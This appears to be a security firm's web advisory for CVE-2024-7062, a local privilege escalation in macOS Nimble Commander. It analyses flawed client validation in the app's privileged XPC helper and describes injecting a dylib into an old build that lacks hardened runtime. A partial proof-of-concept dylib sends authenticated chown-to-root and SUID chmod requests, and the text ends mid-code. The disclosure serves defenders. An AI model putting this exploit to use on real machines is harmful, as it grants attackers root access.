<!doctype html><html lang=en class=scroll-smooth><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><title>CVE-2024-7062 | Pentraze Cybersecurity</title>
<meta name=description content="Pentraze Cybersecurity"><link rel=canonical href=https://pentraze.com/vulnerability-reports/CVE-2024-7062/><link rel=alternate hreflang=en href=https://pentraze.com/vulnerability-reports/CVE-2024-7062/><link rel=alternate hreflang=es href=https://pentraze.com/es/vulnerability-reports/CVE-2024-7062/><link rel=alternate hreflang=x-default href=https://pentraze.com/vulnerability-reports/CVE-2024-7062/><link rel=apple-touch-icon sizes=180x180 href=/imgs/fav/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/imgs/fav/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/imgs/fav/favicon-16x16.png><link rel=manifest href=/imgs/fav/site.webmanifest><link rel=mask-icon href=/imgs/fav/safari-pinned-tab.svg color=#ff0000><link rel="shortcut icon" href=/imgs/fav/favicon.ico><meta name=msapplication-TileColor content="#000000"><meta name=msapplication-config content="/imgs/fav/browserconfig.xml"><meta name=theme-color content="#ffffff"><script src=/js/lang.min.192006c52fa461e4ea2b882584d5aff8d5b25717b0e5da5b54a474fbc6f4f89f.js></script><link rel=stylesheet href=/css/bootstrap.min.css><link rel=stylesheet href=/css/fontAwesome5Pro.css><link href=/css/style.min.94343ac561c66213dcdceea6b6270a1353e000e4941e0ab9eacdc77450fdf26a.css rel=stylesheet><link href=/css/responsive.min.8cd6a089f81109868f726bbc5b18a52d3d1889132461b281143b2cba1e97afc5.css rel=stylesheet><link rel=stylesheet href=/css/owl.carousel.min.css><script async src="https://www.googletagmanager.com/gtag/js?id=G-PPBBD524EZ"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PPBBD524EZ")</script></head><body><div class=offcanvas-area><div class=menu-close><i class="fal fa-times"></i></div><div class=offcanvas-menu><div class=main-menu><ul class=d-block><li><a href=/>Home</a></li><li><a href=/about-us/>About</a></li><li><a href=#services>Services</a></li><li><a href=/cve-numbering-authority/>CNA</a></li><li><a href=/vulnerability-reports/>Vulnerability Reports</a></li></ul><div class="offcanvas-btn text-center"><a href=/contact-us/ class="btn btn-primary btn-black">Contact Us</a></div></div></div></div><div class=offcanvas-overlay></div><header class="header header-theme"><div class="header-wrapper d-flex align-items-center justify-content-between"><a href=/ class=header-logo><img class=logo-light src=/imgs/logo.svg alt>
<img class=logo-dark src=/imgs/logo-white.svg alt></a><div class="header-menu d-none d-lg-block"><nav><ul class="d-flex align-items-center"><li><a href=/>Home</a></li><li><a href=/about-us/>About</a></li><li><a href=#services>Services</a></li><li><a href=/cve-numbering-authority/>CNA</a></li><li><a href=/vulnerability-reports/>Vulnerability Reports</a></li></ul></nav></div><div class="header-end d-flex align-items-center justify-content-end" style=background-color:><div><button class=search-btn>
<img src=/imgs/icons/search-white.svg alt>
</button>
<button type=button class=globe-btn id=dropdown-menu data-bs-toggle=dropdown aria-expanded=false>
<img src=/imgs/icons/globe-white.svg alt></button><div class=dropdown-menu><a class="dropdown-item lang-switch" href=https://pentraze.com/es/vulnerability-reports/CVE-2024-7062/ data-lang=es>Spanish</a></div></div><a href=/contact-us/ class="btn btn-primary d-none d-lg-inline-block">Contact Us</a><div class=menu-open><i class="far fa-bars"></i></div></div></div></header><div class="search-bar white"><div class=container><form method=post class=search-form autocomplete=off><input type=text class=search-input placeholder=Search... autocomplete=off>
<button><i class="far fa-search"></i></button></form></div><div class="mt-2 d-flex justify-content-center"><div class="border rounded p-2 search-table-container d-none"><table class="table search-table"></table></div></div></div><section class=content-area><div class=container><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=/>Home</a></li><li class=breadcrumb-item><a href=/vulnerability-reports/>Vulnerability Reports</a></li><li class="breadcrumb-item active" aria-current=page>CVE-2024-7062</li></ol></nav><div class=reports><h1 class=m-0>macOS Nimble Commander &lt;= v1.6.0 Local Privilege Escalation</h1><p>Jul 24, 2024</p><h3 class=m-0>CVE Number</h3><p>CVE-2024-7062</p><h3 class=m-0>Credits</h3><p>Carlos Garrido of Pentraze Cybersecurity</p></div><div class="content-card reports"><h2 id=summary>Summary</h2><p><code>Nimble Commander</code> suffers from a <em>privilege escalation</em> vulnerability due to the server <strong>(info.filesmanager.Files.PrivilegedIOHelperV2)</strong> performing improper/insufficient validation of a client&rsquo;s authorization before executing an operation. Consequently, it is possible to execute system-level commands as the <code>root</code> user, such as changing permissions and ownership, obtaining a handle (file descriptor) of an arbitrary file, and terminating processes, among other operations.</p><h2 id=cvss>CVSS</h2><p>8.8 (High) - CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</p><h2 id=details>Details</h2><p>When <code>admin mode</code> is <em><strong>enabled</strong></em>, the tool installs a utility in the <code>PrivilegedHelperTools</code> directory: <strong>/Library/PrivilegedHelperTools/info.filesmanager.Files.PrivilegedIOHelperV2</strong>. This server/utility is automatically started by <code>launchd</code> at load (as specified in its <code>plist</code> file with <code>RunAtLoad</code> set to <em><strong>true</strong></em>) and operates with <code>root</code> privileges.</p><p>As a result, client will contact the server <strong>(info.filesmanager.Files.PrivilegedIOHelperV2)</strong> via <code>XPC Inter-Process Communication (IPC)</code> whenever it needs to perform any privileged action on the operating system.</p><p>Due to the macOS security model, in factored applications where privileges are separated into different components (such as <code>PrivilegedHelperTools</code>), it is essential to perform thorough validation (on the server side) of the client attempting to contact it and execute a specific operation.</p><h2 id=server-infofilesmanagerfilesprivilegediohelperv2-allowed-operations>Server (info.filesmanager.Files.PrivilegedIOHelperV2) allowed operations:</h2><p>Under normal conditions, the client has the capability to connect and send a message <strong>(dictionary - xpc_object_t)</strong> to the server, specifying the type of operation to execute. The allowed operations are described in the following structure, <code>g_Handlers</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>static</span> constexpr frozen<span style=color:#f92672>::</span>unordered_map<span style=color:#f92672>&lt;</span>frozen<span style=color:#f92672>::</span>string, <span style=color:#66d9ef>bool</span> (<span style=color:#f92672>*</span>)(<span style=color:#66d9ef>xpc_object_t</span>), <span style=color:#ae81ff>23</span><span style=color:#f92672>&gt;</span> g_Handlers{
</span></span><span style=display:flex><span>    {<span style=color:#e6db74>&#34;heartbeat&#34;</span>, HandleHeartbeat}, <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;uninstall&#34;</span>, HandleUninstall}, <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;exit&#34;</span>, HandleExit},           <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;open&#34;</span>, HandleOpen},           <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;stat&#34;</span>, HandleStat},           <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;lstat&#34;</span>, HandleLStat},         <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;mkdir&#34;</span>, HandleMkDir},         <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;chown&#34;</span>, HandleChOwn},         <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;chflags&#34;</span>, HandleChFlags},     <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;lchflags&#34;</span>, HandleLChFlags},   <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;chmod&#34;</span>, HandleChMod},         <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;chmtime&#34;</span>, HandleChTime},      <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;chctime&#34;</span>, HandleChTime},      <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;chbtime&#34;</span>, HandleChTime},      <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;chatime&#34;</span>, HandleChTime},      <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;rmdir&#34;</span>, HandleRmDir},         <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;unlink&#34;</span>, HandleUnlink},       <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;rename&#34;</span>, HandleRename},       <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;readlink&#34;</span>, HandleReadLink},   <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;symlink&#34;</span>, HandleSymlink},     <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;link&#34;</span>, HandleLink},           <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;killpg&#34;</span>, HandleKillPG},       <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    {<span style=color:#e6db74>&#34;trash&#34;</span>, HandleTrash}          <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
</span></span></code></pre></div><p>What each operation does is self-explanatory based on its name. The issue is that if a <code>malicious and unauthorized client</code>, as we will see later, successfully establishes a remote connection with the server, we can execute any of these sensitive operations <code>(such as chmod, chown, etc.)</code> as the <code>root</code> user.</p><h2 id=vulnerability-code-analysis---client-validation-and-authentication>Vulnerability Code Analysis - Client Validation and Authentication:</h2><p>When a client attempts to establish a connection to the server via the function <code>xpc_connection_create_mach_service(SERVICE, NULL, 0);</code>, the server invokes two functions to validate the client: <code>bool AllowConnectionFrom(const char * client_path)</code> and <code>bool CheckSignature(const char * client_path)</code>, as illustrated below:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>if</span>( <span style=color:#f92672>!</span><span style=color:#a6e22e>AllowConnectionFrom</span>(client_path) <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>CheckSignature</span>(client_path) ) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>syslog_warning</span>(<span style=color:#e6db74>&#34;Client failed checking, dropping connection.&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>xpc_connection_cancel</span>(_connection);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>If everything proceeds correctly, the server handles the event via <code>XPC_Peer_Event_Handler(_connection, event);</code>.</p><ul><li><h3 id=vulnerability-code-analysis---checksignatureclient_path>Vulnerability Code Analysis - CheckSignature(client_path):</h3></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>g_SignatureRequirement <span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;identifier info.filesmanager.Files and &#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;certificate leaf[subject.CN] = </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>Developer ID Application: Mikhail Kazakov (AC5SJT236H)</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SecStaticCodeRef ref <span style=color:#f92672>=</span> nullptr;
</span></span><span style=display:flex><span>status <span style=color:#f92672>=</span> <span style=color:#a6e22e>SecStaticCodeCreateWithPath</span>(url, kSecCSDefaultFlags, <span style=color:#f92672>&amp;</span>ref);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SecRequirementRef req <span style=color:#f92672>=</span> nullptr;
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> CFStringRef reqStr <span style=color:#f92672>=</span> <span style=color:#a6e22e>CFStringCreateWithCString</span>(nullptr, g_SignatureRequirement, kCFStringEncodingUTF8);
</span></span><span style=display:flex><span>status <span style=color:#f92672>=</span> <span style=color:#a6e22e>SecRequirementCreateWithString</span>(reqStr, kSecCSDefaultFlags, <span style=color:#f92672>&amp;</span>req);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>status <span style=color:#f92672>=</span> <span style=color:#a6e22e>SecStaticCodeCheckValidity</span>(ref, kSecCSCheckAllArchitectures, req);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>syslog_notice</span>(<span style=color:#e6db74>&#34;Called SecStaticCodeCheckValidity(), verdict: %s&#34;</span>, status <span style=color:#f92672>==</span> noErr <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;valid&#34;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;not valid&#34;</span>);
</span></span></code></pre></div><p>First, we create a code requirement string with <code>SecRequirementCreateWithString</code>. This requires a reference <code>(req)</code> where it can store the <em>&ldquo;requirement reference&rdquo;</em> and a string <code>(reqStr)</code> representing our code requirement.</p><p>Breaking down the requirement:
The <strong>&ldquo;info.filesmanager.Files&rdquo;</strong> verifies the <code>Bundle ID</code>. Next, <strong>&ldquo;certificate leaf[subject.CN] = "Developer ID Application: Mikhail Kazakov (AC5SJT236H)&rdquo;</strong> verifies the <code>Team ID</code>.</p><p>Finally, the actual verification is performed by using our requirement and the code object using <code>SecStaticCodeCheckValidity()</code>.</p><p>The issue arises from the fact that the application does not validate the client&rsquo;s version at any point, for example: <code>"info [CFBundleShortVersionString] >= \"1.5\""</code>. However, <em>validating the client&rsquo;s version is only meaningful and useful if we know that certain versions of the client prevent injection attacks</em> (e.g., <code>DYLIB Injection</code>).</p><p>If we don&rsquo;t want to verify the client version, we should still verify its <strong>code signing flags</strong> and ensure that it was signed with <code>hardened runtime</code> and/or <code>library validation (CS_REQUIRE_LV).</code> We will cover this procedure at the end of this report.</p><p>The issue lies in the fact that the server does not validate either the <strong>code signing flags</strong> or the <strong>client&rsquo;s version</strong>.</p><ul><li><h3 id=vulnerability-code-analysis---allowconnectionfromclient_path>Vulnerability Code Analysis - AllowConnectionFrom(client_path):</h3></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>bool</span> <span style=color:#a6e22e>AllowConnectionFrom</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>_bin_path)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>( <span style=color:#f92672>!</span>_bin_path )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> false;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>last_sl <span style=color:#f92672>=</span> <span style=color:#a6e22e>strrchr</span>(_bin_path, <span style=color:#e6db74>&#39;/&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>( <span style=color:#f92672>!</span>last_sl )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> false;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>strcmp</span>(last_sl, <span style=color:#e6db74>&#34;/Nimble Commander&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This function validates whether the connecting <strong>clientâs path</strong> ends with <code>"/Nimble Commander"</code>.</p><p>To bypass this specific filter, it is sufficient to have a client whose name is <code>"Nimble Commander"</code>. However, this only solves part of the issue, as if we do not have a client that meets the <code>g_SignatureRequirement</code>, we will not be able to interact with the server and perform arbitrary operations.</p><ul><li><h3 id=vulnerability-code-analysis---authentication>Vulnerability Code Analysis - Authentication:</h3></li></ul><p>In addition to validating the client using the <code>AllowConnectionFrom(client_path)</code> and <code>CheckSignature(client_path)</code> functions, the client must send an authentication message <code>(dictionary - xpc_object_t)</code> before requesting that the server perform any operation. The dictionary must contain a <code>boolean</code> element, where the key to access this value is called <code>"auth"</code>. <em><strong>If the value of this key is not <code>"true"</code>, the server will not process our subsequent operation</strong></em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>  <span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>xpc_dictionary_get_value</span>(_event, <span style=color:#e6db74>&#34;auth&#34;</span>) <span style=color:#f92672>!=</span> nullptr ) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>xpc_dictionary_get_bool</span>(_event, <span style=color:#e6db74>&#34;auth&#34;</span>) <span style=color:#f92672>==</span> true ) {
</span></span><span style=display:flex><span>                context<span style=color:#f92672>-&gt;</span>authenticated <span style=color:#f92672>=</span> true;
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>send_reply_ok</span>(_event);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>send_reply_error</span>(_event, EINVAL);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>        }
</span></span></code></pre></div><h2 id=client-validation-bypass---introduction>Client Validation Bypass - Introduction:</h2><p>The latest version of the software is <code>1.6.0, Build 4087</code>. If we download the <code>image (.dmg)</code>, mount it, and analyze the <strong>code signing flags</strong> of the installer <code>(/Volumes/Nimble\ Commander/Nimble\ Commander.app/Contents/MacOS/Nimble\ Commander)</code>, we find the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-XML data-lang=XML><span style=display:flex><span>Executable=/Volumes/Nimble Commander/Nimble Commander.app/Contents/MacOS/Nimble Commander
</span></span><span style=display:flex><span>Identifier=info.filesmanager.Files
</span></span><span style=display:flex><span>Format=app bundle with Mach-O universal (x86_64 arm64)
</span></span><span style=display:flex><span>CodeDirectory v=20500 size=62883 flags=0x10000(runtime) hashes=1954+7 location=embedded
</span></span><span style=display:flex><span>Signature size=8980
</span></span><span style=display:flex><span>Authority=Developer ID Application: Mikhail Kazakov (AC5SJT236H)
</span></span><span style=display:flex><span>Authority=Developer ID Certification Authority
</span></span><span style=display:flex><span>Authority=Apple Root CA
</span></span><span style=display:flex><span>Timestamp=May 14, 2024 at 3:40:43 PM
</span></span><span style=display:flex><span>Info.plist entries=35
</span></span><span style=display:flex><span>TeamIdentifier=AC5SJT236H
</span></span><span style=display:flex><span>Runtime Version=14.2.0
</span></span><span style=display:flex><span>Sealed Resources version=2 rules=13 files=144
</span></span><span style=display:flex><span>Internal requirements count=1 size=216
</span></span><span style=display:flex><span>Warning: Specifying &#39;:&#39; in the path is deprecated and will not work in a future release
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;https://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span><span style=color:#f92672>&lt;plist</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;1.0&#34;</span><span style=color:#f92672>&gt;&lt;dict&gt;&lt;key&gt;</span>com.apple.application-identifier<span style=color:#f92672>&lt;/key&gt;&lt;string&gt;</span>AC5SJT236H.info.filesmanager.Files<span style=color:#f92672>&lt;/string&gt;&lt;key&gt;</span>com.apple.developer.team-identifier<span style=color:#f92672>&lt;/key&gt;&lt;string&gt;</span>AC5SJT236H<span style=color:#f92672>&lt;/string&gt;&lt;key&gt;</span>com.apple.security.automation.apple-events<span style=color:#f92672>&lt;/key&gt;&lt;true/&gt;&lt;/dict&gt;&lt;/plist&gt;</span>
</span></span></code></pre></div><p>Although the client meets the <code>(g_SignatureRequirement)</code> criterion, we cannot exploit it to inject code and interact with the server to execute arbitrary commands because the binary is signed with <strong>&ldquo;Hardened Runtime&rdquo;</strong>. Therefore, it benefits from the same protections as a binary protected by <code>SIP (rootless)</code>.</p><p>However, what if we can find a version of the application installer that is signed with the <code>certificate (Mikhail Kazakov - Team ID: AC5SJT236H)</code> and has a <code>Bundle ID</code> of <strong>info.filesmanager.Files</strong>, but <em>is not signed</em> with <strong>&ldquo;Hardened Runtime&rdquo;</strong>?</p><p>If we check the list of releases available at <code>https://magnumbytes.com/downloads/releases/old/</code>, we will find a binary with <strong>Hardened Runtime</strong> disabled:</p><pre tabindex=0><code>nimble-commander-1.1.2(1621).dmg	2016-08-25 00:22	4.0M	 
nimble-commander-1.1.3(1695).dmg	2016-07-27 01:25	4.0M	 
nimble-commander-1.1.5(1812).dmg	2016-09-29 04:20	4.9M	 
nimble-commander-1.2.0(2085).dmg	2017-03-10 20:35	5.0M	 
.
.
&lt;SNIP&gt;
.
.	 
nimble-commander-1.3.0(3711).dmg	2021-10-16 17:17	10M	 
nimble-commander-1.4.0(3883).dmg	2022-12-25 14:11	10M	 
nimble-commander-1.5.0(3981).dmg	2023-12-18 12:52	9.4M	 
</code></pre><p>If we take the <code>version 1.1.2, Build 1621 (nimble-commander-1.1.2(1621).dmg)</code> and validate the <strong>code signing flags</strong> of the installer <code>(/Volumes/Nimble Commander/Nimble Commander.app/Contents/MacOS/Nimble Commander)</code>, we will find the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-XML data-lang=XML><span style=display:flex><span>Executable=/Volumes/Nimble Commander/Nimble Commander.app/Contents/MacOS/Nimble Commander
</span></span><span style=display:flex><span>Identifier=info.filesmanager.Files
</span></span><span style=display:flex><span>Format=app bundle with Mach-O thin (x86_64)
</span></span><span style=display:flex><span>CodeDirectory v=20200 size=34871 flags=0x0(none) hashes=1082+5 location=embedded
</span></span><span style=display:flex><span>Signature size=8918
</span></span><span style=display:flex><span>Authority=Developer ID Application: Mikhail Kazakov (AC5SJT236H)
</span></span><span style=display:flex><span>Authority=Developer ID Certification Authority
</span></span><span style=display:flex><span>Authority=Apple Root CA
</span></span><span style=display:flex><span>Timestamp=Jun 4, 2016 at 7:58:58 AM
</span></span><span style=display:flex><span>Info.plist entries=29
</span></span><span style=display:flex><span>TeamIdentifier=AC5SJT236H
</span></span><span style=display:flex><span>Sealed Resources version=2 rules=12 files=99
</span></span><span style=display:flex><span>Internal requirements count=1 size=216
</span></span><span style=display:flex><span>Warning: Specifying &#39;:&#39; in the path is deprecated and will not work in a future release
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;https://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span><span style=color:#f92672>&lt;plist</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;1.0&#34;</span><span style=color:#f92672>&gt;&lt;dict&gt;&lt;/dict&gt;&lt;/plist&gt;</span>
</span></span></code></pre></div><p>As we can observe, this version of the binary <code>(1.1.2)</code> was <em>signed with the same certificate as the latest version released to date <code>(1.6.0)</code></em>, with the exception that version <code>1.1.2</code> <em><strong>was not signed (flags=0x0) with &ldquo;Hardened Runtime&rdquo;</strong></em>. This means we can use this version of the client to <em>inject malicious code</em>, effectively using it as an intermediary to contact the <code>server - PrivilegedHelperTool utility (info.filesmanager.Files.PrivilegedIOHelperV2 - version 1.6.0)</code> and execute arbitrary operations that may allow us to escalate to <code>root</code>.</p><p>Additionally, by using version <code>1.1.2</code>, we can logically bypass the validation performed by the previously explained function, <code>AllowConnectionFrom(client_path)</code>.</p><h2 id=client-validation-bypass---exploit>Client Validation Bypass - Exploit:</h2><ul><li><h3 id=dynamic-library-dylib>Dynamic Library (DYLIB):</h3></li></ul><p>To exploit the server latest version <code>(1.6.0)</code>, we will create a library <code>(DYLIB)</code> to be injected into the client that <em><strong>was not signed (flags=0x0) with &ldquo;Hardened Runtime&rdquo;</strong></em> <code>(1.1.2)</code>. As a result, we will establish a successful remote connection with the server. In our case, we will execute three operations:</p><ol><li><code>Authentication</code>.</li><li>Change the user and group <code>(chown)</code> of a file.</li><li>Assign <code>SUID</code> permissions <code>(chmod)</code> to the file.</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;xpc/xpc.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define SERVICE  &#34;info.filesmanager.Files.PrivilegedIOHelperV2&#34;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>__attribute__</span>((constructor))
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>privesc</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Nimble Commander - macOS Local Privilege Escalation Exploit:</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Change permissions (suid) operation array declaration
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>xpc_object_t</span> chmod_operation <span style=color:#f92672>=</span> <span style=color:#a6e22e>xpc_dictionary_create</span>(NULL, NULL, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Change owner (chown) array declaration
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>xpc_object_t</span> chown_operation <span style=color:#f92672>=</span> <span style=color:#a6e22e>xpc_dictionary_create</span>(NULL, NULL, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Authentication array declaration
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>xpc_object_t</span> authentication <span style=color:#f92672>=</span> <span style=color:#a6e22e>xpc_dictionary_create</span>(NULL, NULL, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Authentication array definition
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>xpc_dictionary_set_bool</span>(authentication, <span style=color:#e6db74>&#34;auth&#34;</span>, true);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Change Owner (chown) operation array definition
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>xpc_dictionary_set_string</span>(chown_operation, <span style=color:#e6db74>&#34;operation&#34;</span>, <span style=color:#e6db74>&#34;chown&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>xpc_dictionary_set_string</span>(chown_operation, <span style=color:#e6db74>&#34;path&#34;</span>, <span style=color:#e6db74>&#34;/Users/garrido/Research/privesc&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>xpc_dictionary_set_int64</span>(chown_operation, <span style=color:#e6db74>&#34;uid&#34;</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>xpc_dictionary_set_int64</span>(chown_operation, <span style=color:#e6db74>&#34;gid&#34;</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Change permissions (suid) operation array definition
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>xpc_dictionary_set_string</span>(chmod_operation, <span style=color:#e6db74>&#34;operation&#34;</span>, <span style=color:#e6db74>&#34;chmod&#34;</span>);
